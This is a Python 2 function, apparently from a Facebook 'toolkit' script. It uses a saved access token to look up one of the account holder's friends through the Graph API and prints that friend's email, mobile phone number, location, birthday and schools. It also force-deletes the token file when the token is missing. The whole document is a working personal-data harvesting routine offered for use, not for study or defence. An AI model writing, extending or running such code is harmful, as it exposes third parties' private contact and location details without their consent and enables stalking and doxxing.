def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo16
	aid = raw_input('\033[1;97mEnter ID\033[1;97m/\033[1;97mName\033[1;97m : \033[1;97m')
	jalan('\033[1;97mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m"
			try:
				print '\033[1;97mName\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;97mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;97mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;97mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;97mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;97m[?] \033[1;97mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;97mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;97mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;97mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;97mLocation\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;97mDate of birth\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;97mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;97mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;97m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
			asif()
		else:
			pass
	else:
		print"\033[1;91m User not found"
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		menu()

